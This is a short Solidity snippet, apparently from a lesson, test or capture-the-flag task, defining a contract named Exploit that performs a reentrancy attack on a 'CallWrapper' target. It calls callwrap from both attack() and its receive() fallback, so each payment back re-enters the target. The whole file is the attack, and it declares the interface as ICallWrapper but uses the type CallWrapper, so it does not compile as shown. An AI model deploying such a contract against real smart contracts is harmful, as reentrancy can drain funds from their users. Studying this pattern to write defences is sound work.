interface ICallWrapper {
    function callwrap(address called) external;
}

contract Exploit {
    CallWrapper target;

    constructor(address _target) {
        target = CallWrapper(_target);
    }

    receive() external payable {
        target.callwrap(address(this));
    }

    function attack() public payable {
        target.callwrap(address(this));
    }
}